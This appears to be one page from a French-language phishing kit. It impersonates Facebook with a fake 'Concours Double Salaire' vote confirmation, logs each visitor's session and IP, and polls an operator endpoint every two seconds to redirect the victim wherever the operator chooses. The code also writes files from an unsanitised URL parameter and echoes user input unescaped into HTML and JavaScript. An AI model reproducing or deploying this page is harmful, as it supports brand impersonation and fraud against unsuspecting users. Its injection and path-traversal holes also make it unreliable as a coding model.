<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'vote_accepted.php',
    'timestamp' => time(),
    'ip' => $clientIp
];
file_put_contents($trackingFile, json_encode($trackingData));
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vote accepté</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            max-width: 60px;
            margin-bottom: 15px;
        }
        
        .success-card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .success-icon {
            font-size: 48px;
            color: #4caf50;
            margin-bottom: 20px;
        }
        
        .success-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #4caf50;
        }
        
        .success-message {
            color: #65676b;
            margin-bottom: 20px;
        }
        
        .vote-info {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding: 10px;
            background-color: #e8f5e9;
            border-radius: 8px;
        }
        
        .vote-icon {
            font-size: 24px;
            color: #4caf50;
            margin-right: 15px;
        }
        
        .vote-text {
            font-size: 16px;
            color: #4caf50;
            font-weight: 500;
        }
        
        .home-button {
            display: inline-block;
            padding: 10px 16px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
        }
        
        .home-button:hover {
            background-color: #166fe5;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #65676b;
            font-size: 12px;
        }
        
        .footer a {
            color: #65676b;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/150px-Facebook_f_logo_%282019%29.svg.png" alt="Logo" class="logo">
        </div>
        
        <div class="success-card">
            <div class="success-icon">
                <i class="fas fa-check-circle"></i>
            </div>
            
            <div class="success-title">Vote accepté</div>
            <p class="success-message">Votre vote a été accepté avec succès. Nous procédons à la vérification finale.</p>
            
            <div class="vote-info">
                <div class="vote-icon">
                    <i class="fas fa-vote-yea"></i>
                </div>
                <div class="vote-text">
                    Vote enregistré pour le concours Double Salaire
                </div>
            </div>
            
            <a href="index.php?session=<?php echo $sessionId; ?>&ip=<?php echo $clientIp; ?>" class="home-button">
                Retour à l'accueil
            </a>
        </div>
        
        <div class="footer">
            <p>© 2025 Concours Double Salaire. Tous droits réservés.</p>
            <p><a href="#">Conditions d'utilisation</a> · <a href="#">Politique de confidentialité</a></p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo $sessionId; ?>';
            const clientIp = '<?php echo $clientIp; ?>';
            
            // Fonction pour vérifier s'il y a une action à effectuer
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                .then(response => response.json())
                .then(data => {
                    if (data.action) {
                        if (data.action === 'custom' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else {
                            window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
                        }
                    }
                })
                .catch(error => {
                    console.error('Erreur lors de la vérification des actions:', error);
                });
            }
            
            // Vérifier les actions toutes les 2 secondes
            setInterval(checkAction, 2000);
        });
    </script>
</body>
</html>